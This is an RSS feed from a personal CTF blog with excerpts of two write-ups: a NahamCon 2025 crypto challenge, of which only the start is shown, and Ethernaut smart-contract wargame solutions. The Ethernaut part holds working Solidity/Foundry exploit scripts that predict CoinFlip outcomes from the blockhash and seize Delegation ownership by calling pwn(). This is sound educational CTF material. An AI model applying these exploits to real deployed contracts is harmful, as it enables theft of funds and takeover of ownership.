<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on xiaowenji&#39;s blog</title>
    <link>https://xiaowenjictf.github.io/categories/ctf/</link>
    <description>Recent content from xiaowenji&#39;s blog</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    
    <managingEditor>ctfxiaowenji@gmail.com (xiaowenji)</managingEditor>
    <webMaster>ctfxiaowenji@gmail.com (xiaowenji)</webMaster>
    
    <copyright>All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!</copyright>
    
    <lastBuildDate>Fri, 12 Sep 2025 12:00:00 -0400</lastBuildDate>
    
    
    <atom:link href="https://xiaowenjictf.github.io/categories/ctf/index.xml" rel="self" type="application/rss&#43;xml" />
    

    
    

    <item>
      <title>Nahamcon 2025 write up</title>
      <link>https://xiaowenjictf.github.io/post/nahamcom/</link>
      <pubDate>Fri, 12 Sep 2025 12:00:00 -0400</pubDate>
      <author>ctfxiaowenji@gmail.com (xiaowenji)</author>
      <guid>https://xiaowenjictf.github.io/post/nahamcom/</guid>
      <description>
        <![CDATA[<h1>Nahamcon 2025 write up</h1><p>Author: xiaowenji(ctfxiaowenji@gmail.com)</p>
        
          <h1 id="challenge-overview">
<a class="header-anchor" href="#challenge-overview"></a>
Challenge Overview
</h1><p>The Crypto Clock challenge from Nahamcon 2025 provides an encrypted flag and some source code that generates a pseudo-random key using the current timestamp as a seed. The goal is to recover the original flag by replicating the key generation logic.</p>
<h2 id="initial-analysis">
<a class="header-anchor" href="#initial-analysis"></a>
Initial Analysis
</h2><p>We are given the following encrypted flag:</p>
<figure><img src="/images/ctfs/nahamcon2025/nc.png"
    alt="nc output">
</figure>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a6717b705265d3b9d810736c72b27bc8bcc5d245e68ccada61f8c16277d5a8bb5655db3cc7d0&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(len(flag))
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(len(flag)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">38.0</span>
</span></span></code></pre></div><blockquote>
<p>The hex-encoded string is 76 characters long, which corresponds to 38 bytes.</p>
        
        <hr><p>Published on 2025-09-12 at <a href='https://xiaowenjictf.github.io/'>xiaowenji's blog</a>, last modified on 2025-09-12</p>]]>
      </description>
      
        <category>ctf</category>
      
    </item>
    
    

    <item>
      <title>Ethernaut Challenges</title>
      <link>https://xiaowenjictf.github.io/post/ethernaut/</link>
      <pubDate>Thu, 11 Sep 2025 12:00:00 -0400</pubDate>
      <author>ctfxiaowenji@gmail.com (xiaowenji)</author>
      <guid>https://xiaowenjictf.github.io/post/ethernaut/</guid>
      <description>
        <![CDATA[<h1>Ethernaut Challenges</h1><p>Author: xiaowenji(ctfxiaowenji@gmail.com)</p>
        
          <h1 id="solving-ethernaut-challenges">
<a class="header-anchor" href="#solving-ethernaut-challenges"></a>
Solving ethernaut challenges!
</h1><h2 id="coinflip">
<a class="header-anchor" href="#coinflip"></a>
CoinFlip
</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">13</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/console.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;../src/CoinFlip.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Exploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">constant</span> <span style="color:#a6e22e">FACTOR</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoinFlip</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">coinFlipInstance</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">CoinFlip</span> <span style="color:#a6e22e">_coinFlipInstance</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">coinFlipInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_coinFlipInstance</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">FACTOR</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">side</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">coinFlipInstance</span>.<span style="color:#a6e22e">flip</span>(<span style="color:#a6e22e">side</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">CoinFlipSolution</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">Script</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoinFlip</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">coinFlipInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CoinFlip</span>(<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">YOUR_INSTANCE</span><span style="color:#f92672">&gt;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">startBroadcast</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">envUint</span>(<span style="color:#e6db74">&#34;PRIVATE_KEY&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Exploit</span> <span style="color:#a6e22e">exploit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exploit</span>(<span style="color:#a6e22e">coinFlipInstance</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exploit</span>.<span style="color:#a6e22e">attack</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Number of wins:&#34;</span>, <span style="color:#a6e22e">coinFlipInstance</span>.<span style="color:#a6e22e">consecutiveWins</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">stopBroadcast</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Running the script to solve the challenge:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_URL --tc CoinFlipSolution --broadcast
</span></span></code></pre></div><h2 id="delegation">
<a class="header-anchor" href="#delegation"></a>
Delegation
</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/console.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;../src/Delegation.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">TokenSolution</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">Script</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Delegation</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">delegationInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Delegation</span>(<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">YOUR_INSTANCE</span><span style="color:#f92672">&gt;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">startBroadcast</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">envUint</span>(<span style="color:#e6db74">&#34;PRIVATE_KEY&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">delegationInstance</span>).<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeWithSignature</span>(<span style="color:#e6db74">&#34;pwn()&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Owner of the contract is currently: &#34;</span>, <span style="color:#a6e22e">delegationInstance</span>.<span style="color:#a6e22e">owner</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;My current address: &#34;</span>, <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">envAddress</span>(<span style="color:#e6db74">&#34;MY_ADDRESS&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">stopBroadcast</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Running the script to solve the challenge:</p>
        
        <hr><p>Published on 2025-09-11 at <a href='https://xiaowenjictf.github.io/'>xiaowenji's blog</a>, last modified on 2025-09-11</p>]]>
      </description>
      
        <category>ctf</category>
      
    </item>
    
  </channel>
</rss>
